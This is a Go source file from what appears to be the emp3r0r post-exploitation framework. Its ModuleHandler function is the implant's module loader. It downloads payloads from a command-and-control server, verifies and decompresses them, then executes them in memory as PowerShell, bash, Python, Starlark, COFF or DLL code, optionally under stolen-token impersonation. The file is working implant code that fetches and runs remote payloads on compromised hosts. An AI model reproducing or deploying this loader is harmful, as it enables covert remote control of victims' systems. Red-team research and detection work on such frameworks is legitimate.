package modules

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var fetchFile = c2transport.FetchFile

// ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
	// Canonicalize module names for download/cache keys across all module types.
	modName = strings.ToLower(modName)
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("ModuleHandler panic executing %s (%s): %v\n%s", modName, payload_type, r, util.CallStack())
			out = logging.Sprintf("module execution panic: %v", r)
		}
	}()

	var err error

	// download and verify module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, peerIP)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	// in memory execution
	payload_data, err := util.Decompress(payload_data_downloaded)
	if err != nil {
		return logging.Sprintf("decompressing %s: %v", file_to_download, err)
	}

	// switch on payload type, in memory execution
	switch payload_type {
	case "powershell":
		err = executeWithToken(invocation.Token, func(tok uintptr) error {
			if tok != 0 {
				logging.Warningf("powershell module: token provided but child process cannot use thread impersonation; use a starlark module for token-aware execution")
			}
			var execErr error
			out, execErr = agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
			if execErr != nil {
				out = logging.Sprintf("running powershell script: %s (%v)", out, execErr)
			}
			return nil // output already captured; don't mask with token error
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "bash":
		err = executeWithToken(invocation.Token, func(tok uintptr) error {
			if tok != 0 {
				logging.Warningf("bash module: token provided but child process cannot use thread impersonation; use a starlark module for token-aware execution")
			}
			var execErr error
			out, execErr = agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
			if execErr != nil {
				out = logging.Sprintf("running shell script: %s (%v)", out, execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "python":
		err = executeWithToken(invocation.Token, func(tok uintptr) error {
			if tok != 0 {
				logging.Warningf("python module: token provided but child process cannot use thread impersonation; use a starlark module for token-aware execution")
			}
			var execErr error
			out, execErr = agentutils.ExecutePython(payload_data, invocation.Argv, nil)
			if execErr != nil {
				out = logging.Sprintf("running python script: %s (%v)", out, execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "starlark":
		err = executeWithToken(invocation.Token, func(token uintptr) error {
			var execErr error
			out, execErr = script.Run(payload_data, invocation.Argv, nil, token)
			if execErr != nil {
				out = logging.Sprintf("running starlark module: %v", execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "coff":
		err = executeWithToken(invocation.Token, func(token uintptr) error {
			var execErr error
			out, execErr = runCOFFModule(payload_data, invocation, token)
			if execErr != nil {
				out = logging.Sprintf("running COFF module: %v", execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "dll":
		// Cache the decompressed DLL image in memfs so dependent BOF modules
		// can re-load it without re-downloading from C2. Module names are
		// canonicalized to lowercase to match fetchDependencyDLL.
		_ = util.WriteFileAgent("mem:///"+modName+".dll", payload_data, 0o600)
		err = executeWithToken(invocation.Token, func(token uintptr) error {
			var execErr error
			out, execErr = runDLLModule(payload_data, invocation, token)
			if execErr != nil {
				out = logging.Sprintf("running DLL module: %v", execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	default:
		return logging.Sprintf("unknown payload type %s or custom loader not available", payload_type)
	}
}

func downloadAndVerifyModule(file_to_download, checksum, peerIP string) (data []byte, err error) {
	// Modules are cached in memfs under their basename (e.g. mem:///sa_whoami).
	// FetchFile already checks the memfs cache as tier-1, so we just call it.
	// On success, cache is populated automatically for future calls.
	for retry := 0; retry < 3; retry++ {
		data, err = fetchFile(common.RuntimeConfig, peerIP, file_to_download, "", checksum)
		if err != nil {
			logging.Print(fmt.Sprintf("downloadAndVerifyModule attempt %d/3 for %s: %v", retry+1, file_to_download, err))
			util.TakeABlink()
			continue
		}
		if crypto.SHA256SumRaw(data) == checksum {
			return data, nil
		}
		logging.Print(fmt.Sprintf("Checksum failed, restarting... (attempt %d/3)", retry+1))
		util.TakeABlink()
		// Evict bad entry from memfs so next attempt re-fetches
		memKey := c2transport.MemFSKey(file_to_download)
		_ = util.RemoveFileAgent(memKey)
	}

	return nil, fmt.Errorf("downloading %s: checksum verification failed after 3 attempts", file_to_download)
}
